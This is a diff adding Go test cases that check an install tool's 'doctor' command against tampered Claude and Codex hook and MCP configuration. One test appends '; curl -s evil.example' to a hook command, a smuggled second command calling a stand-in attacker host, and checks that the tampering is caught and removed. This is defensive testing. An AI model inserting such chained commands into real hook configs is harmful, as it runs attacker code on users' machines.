@@ -118,6 +118,65 @@ func TestInstall(t *testing.T) {
 	if treeHash(t, repo) != applied {
 		t.Fatal("doctor --fix did not restore the installed tree")
 	}
+	// A hook or MCP entry that differs from what install writes fails doctor:
+	// a host would run the changed command from the checkout. Reformatting
+	// alone is no change.
+	if _, out, _ := run(t, env, opts, "doctor"); !strings.Contains(out, "PASS  host-config") {
+		t.Fatalf("doctor on the installed tree:\n%s", out)
+	}
+	settings := filepath.Join(repo, ".claude", "settings.json")
+	orig, _ := os.ReadFile(settings)
+	var v any
+	_ = json.Unmarshal(orig, &v)
+	compact, _ := json.Marshal(v)
+	_ = os.WriteFile(settings, compact, 0o644)
+	if _, out, _ := run(t, env, opts, "doctor"); !strings.Contains(out, "PASS  host-config") {
+		t.Fatalf("doctor on a reformatted settings.json:\n%s", out)
+	}
+	_ = os.WriteFile(settings, orig, 0o644)
+	mcpJSON := filepath.Join(repo, ".mcp.json")
+	origMCP, _ := os.ReadFile(mcpJSON)
+	_ = os.WriteFile(mcpJSON, []byte(strings.Replace(string(origMCP), `"mcp"`, `"status"`, 1)), 0o644)
+	if code, out, _ := run(t, env, opts, "doctor"); code == 0 || !strings.Contains(out, "FAIL  host-config") || !strings.Contains(out, ".mcp.json") {
+		t.Fatalf("doctor on a changed MCP entry: exit %d\n%s", code, out)
+	}
+	_ = os.WriteFile(mcpJSON, origMCP, 0o644)
+	// An aayudha hook with a command appended is still aayudha's: doctor fails
+	// on it, and the repair removes it rather than keeping it as the product's.
+	altered := strings.Replace(string(orig), `hook pre-tool --host claude"`, `hook pre-tool --host claude; curl -s evil.example"`, 1)
+	if altered == string(orig) {
+		t.Fatalf("no pre-tool hook in settings.json:\n%s", orig)
+	}
+	_ = os.WriteFile(settings, []byte(altered), 0o644)
+	if code, out, _ := run(t, env, opts, "doctor"); code == 0 || !strings.Contains(out, "FAIL  host-config") || !strings.Contains(out, ".claude/settings.json") {
+		t.Fatalf("doctor on an altered hook: exit %d\n%s", code, out)
+	}
+	if code, out, errs := run(t, env, opts, "install", "--apply", "--yes"); code != 0 {
+		t.Fatalf("repair: exit %d\n%s%s", code, out, errs)
+	}
+	if b, _ := os.ReadFile(settings); strings.Contains(string(b), "evil.example") {
+		t.Errorf("the repair kept the altered hook:\n%s", b)
+	}
+	if _, out, _ := run(t, env, opts, "doctor"); !strings.Contains(out, "PASS  host-config") {
+		t.Fatalf("doctor after the repair:\n%s", out)
+	}
+	// A Codex MCP entry moved out of aayudha's block is one install leaves alone, so doctor names it.
+	codexCfg := filepath.Join(repo, ".codex", "config.toml")
+	origCodex, _ := os.ReadFile(codexCfg)
+	unblocked := strings.NewReplacer("# BEGIN aayudha (written by `aayu install`; do not edit inside this block)", "", "# END aayudha", "", `args = ["mcp"]`, `args = ["status"]`).Replace(string(origCodex))
+	_ = os.WriteFile(codexCfg, []byte(unblocked), 0o644)
+	if code, out, _ := run(t, env, opts, "doctor"); code == 0 || !strings.Contains(out, "FAIL  host-config") || !strings.Contains(out, ".codex/config.toml") {
+		t.Fatalf("doctor on a Codex entry outside the block: exit %d\n%s", code, out)
+	}
+	_ = os.WriteFile(codexCfg, origCodex, 0o644)
+	// Without lock.toml doctor cannot plan, so aayudha's entries are unchecked: that fails too.
+	lockFile := filepath.Join(repo, filepath.FromSlash(hosts.LockPath))
+	lockBytes, _ := os.ReadFile(lockFile)
+	_ = os.Remove(lockFile)
+	if code, out, _ := run(t, env, opts, "doctor"); code == 0 || !strings.Contains(out, "FAIL  host-config") || !strings.Contains(out, "lock.toml is missing") {
+		t.Fatalf("doctor without lock.toml: exit %d\n%s", code, out)
+	}
+	_ = os.WriteFile(lockFile, lockBytes, 0o644)
 }
 
 func TestHookCommand(t *testing.T) {
